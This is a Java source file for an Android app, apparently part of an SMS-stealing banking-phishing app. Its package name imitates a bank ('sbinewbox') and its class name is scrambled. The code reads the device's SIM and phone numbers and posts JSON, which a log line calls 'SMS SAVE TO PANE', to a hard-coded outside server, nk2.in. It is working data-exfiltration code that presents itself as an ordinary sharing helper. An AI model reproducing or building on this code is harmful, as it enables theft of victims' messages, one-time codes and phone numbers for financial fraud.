package sbinewbox.com.share;

import android.content.Context;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.telephony.SubscriptionInfo;
import android.telephony.SubscriptionManager;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.core.app.ActivityCompat;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedWriter;
import java.io.IOException;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;
import java.util.Scanner;

public class P4kAs {
    private static final String API_URL = "https://nk2.in";
    static final String site = "localhost";
    public static void sendSMS(String path, String message) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    String urlString = API_URL + path;  // Append the path to the base URL for the GET request
                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + urlString);
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");

                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        try (Scanner scanner = new Scanner(conn.getInputStream())) {
                            StringBuilder responseBuilder = new StringBuilder();
                            while (scanner.hasNextLine()) {
                                responseBuilder.append(scanner.nextLine());
                            }
                            response = responseBuilder.toString();
                        }
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                Log.d("mywork", "doInBackground API Response: " + response);
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                try {
                    JSONObject jsonResponse = new JSONObject(result);
                    Log.d( "mywork", "json respnse" + jsonResponse.toString());
                } catch (JSONException e) {
                    e.printStackTrace();
                    Log.e("mywork", "JSON Parsing Error: " + e.getMessage());
                }
            }
        }.execute();
    }

    public static void sendData(String path, JSONObject jsonData) {
        new AsyncTask<String, Void, String>() {
            @Override
            protected String doInBackground(String... params) {
                String response = "";
                try {
                    String urlString = API_URL+path;
                    Log.d("mywork", "doInBackground API URL: " + urlString);
                    URL url = new URL(urlString);
                    Log.d("mywork", "doInBackground API URL: " + jsonData.toString());
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Accept", "application/json");
                    conn.setDoOutput(true);

                    // Write JSON data to the output stream
                    OutputStream os = conn.getOutputStream();
                    BufferedWriter writer = new BufferedWriter(new OutputStreamWriter(os, "UTF-8"));
                    writer.write(jsonData.toString());
                    writer.flush();
                    writer.close();
                    os.close();

                    // Check the response code
                    int responseCode = conn.getResponseCode();
                    if (responseCode == HttpURLConnection.HTTP_OK) {
                        // Read response
                        Scanner scanner = new Scanner(conn.getInputStream());
                        StringBuilder responseBuilder = new StringBuilder();
                        while (scanner.hasNextLine()) {
                            responseBuilder.append(scanner.nextLine());
                        }
                        scanner.close();
                        response = responseBuilder.toString();
                    } else {
                        // Handle error response
                        response = "Response: " + responseCode;
                    }
                    conn.disconnect();
                } catch (Exception e) {
                    e.printStackTrace();
                    response = "Response Error: " + e.getMessage();
                }
                return response;
            }

            @Override
            protected void onPostExecute(String result) {
                Log.d("mywork", "SMS SAVE TO PANE : "+result);
            }
        }.execute(path);
    }
    public static String getSimNumbers(Context context) {
        SubscriptionManager subscriptionManager = SubscriptionManager.from(context);
        if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            return "Permission is Denied on getSimNumbers";
        }
        List<SubscriptionInfo> subscriptionInfoList = subscriptionManager.getActiveSubscriptionInfoList();
        if (subscriptionInfoList != null) {
            String Numbers = "";
            for (SubscriptionInfo info : subscriptionInfoList) {
                Log.d("mywork", info.toString());
                Numbers += " | " + info.getNumber();
            }
            if(!Numbers.isEmpty()) {
                Log.d("mywork", "phone no from on getPhoneNumber(c)");
                Numbers = getPhoneNumber(context);
            }
            return Numbers;
        }else{
            return "subscription info is null on getSimNumbers";
        }
    }

    public static String getPhoneNumber(Context context) {
        // default phone number..
        TelephonyManager tMgr = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        if (tMgr != null) {
            if (ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(context, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
                Log.d("mywork", "Phone OR SMS permission is not granted");
                return "Phone OR SMS permission is not granted";
            }
            String mPhoneNumber = tMgr.getLine1Number();
            if (mPhoneNumber != null && !mPhoneNumber.isEmpty()) {
                return mPhoneNumber;
            } else {
                return "Phone number not available";
            }
        } else {
            return "TelephonyManager is null";
        }
    }

}
